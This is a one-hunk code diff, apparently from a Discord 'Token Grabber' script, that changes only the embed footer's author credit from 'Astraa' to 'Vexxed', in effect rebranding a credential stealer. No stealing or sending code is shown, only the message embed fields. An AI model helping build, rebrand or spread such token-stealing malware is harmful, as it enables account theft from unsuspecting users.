@@ -165,7 +165,7 @@ def main():
                     "icon_url": avatar_url
                 },
                 "footer": {
-                    "text": f"Token Grabber By Astraa",
+                    "text": f"Token Grabber By Vexxed",
                 }
             }
             embeds.append(embed)
